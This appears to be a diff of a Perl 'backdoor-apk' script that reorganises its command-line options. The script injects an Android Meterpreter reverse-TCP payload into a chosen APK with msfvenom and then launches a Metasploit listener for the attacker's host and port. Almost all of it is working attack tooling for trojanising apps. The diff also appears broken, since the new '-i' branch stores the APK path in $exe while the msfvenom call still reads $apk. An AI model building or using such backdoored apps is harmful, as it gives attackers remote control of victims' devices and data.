@@ -1,18 +1,17 @@
 #!/usr/bin/perl
 #Coded By Zero#
-$apk=$ARGV[0];
-$host=$ARGV[1];
-$port=$ARGV[2];   
-$out=$ARGV[3]; 
-if( $ARGV[0] eq '-h' || $ARGV[0] eq '' || $ARGV[0] eq '--help')
-{
-print "Usage: backdoor-apk <apk> <ip/ddns> <port> <out>\n\n";
+if( $ARGV[0] eq '-h' || $ARGV[0] eq '--help') {
+print "Usage: backdoor-apk -i <apk> <ip/ddns> <port> <out>\n\n";
 print "Usage: backdoor-apk -n <apk> <ngrok_host> <ngrok_port> <fwdport> <out>\n\n";
 print "Ex: https://github.com/YSpoof/backdoor-apk\n";
-exit;
-}
+exit; }
 
 #NoNgrok
+if( $ARGV[0] eq '-i') {
+$exe=$ARGV[1];
+$host=$ARGV[2];
+$port=$ARGV[3];   
+$out=$ARGV[4]; 
 
 system("msfvenom -x $apk -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $out");
 system("clear");
@@ -24,10 +23,9 @@ system("echo set lport $port >> /tmp/x");
 system("echo run >> /tmp/x");
 system("echo clear >> /tmp/x");
 print("Opening MSF..\n");
-system("msfconsole -q -r /tmp/x");
+system("msfconsole -q -r /tmp/x"); }
 
 #Ngrok
-
 if( $ARGV[0] eq '-n' ) {
 $apk=$ARGV[1];
 $host=$ARGV[2];
